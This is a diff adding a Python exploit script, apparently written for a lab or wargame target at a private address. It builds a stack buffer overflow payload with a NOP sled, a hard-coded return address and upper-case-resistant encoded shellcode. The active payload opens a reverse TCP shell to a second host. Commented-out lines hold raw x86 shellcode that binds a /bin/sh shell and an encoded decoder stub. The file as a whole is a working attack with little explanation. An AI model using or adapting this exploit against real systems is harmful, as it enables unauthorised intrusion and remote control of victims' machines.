@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+import struct
+import sys
+import re
+from pwnpy.pwn import *
+
+sock = connect_to('10.10.10.4', 2995)
+
+ret_to_esp = struct.pack('I', 0xbffffc60)
+shellcode_ptr = struct.pack('I', 0xbffffa4a)
+
+#decoder = b"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed"
+
+#shellcode = b"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"
+
+#shellcode = encode_toUpper_resistant(b"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80")
+
+shellcode = encode_toUpper_resistant(make_reverse_tcp('10.10.10.5', 31337))
+
+
+sys.stderr.buffer.write(shellcode)
+sys.stderr.flush()
+
+buf = b''
+buf += b'\x90' * 30
+#buf += decoder
+buf += shellcode
+buf = buf.ljust(512, b'\x90')
+buf += create_pattern(0x5)
+buf += shellcode_ptr
+buf += b'\n'
+
+
+sock.send(buf)
+
+print(sock.recv(1024))
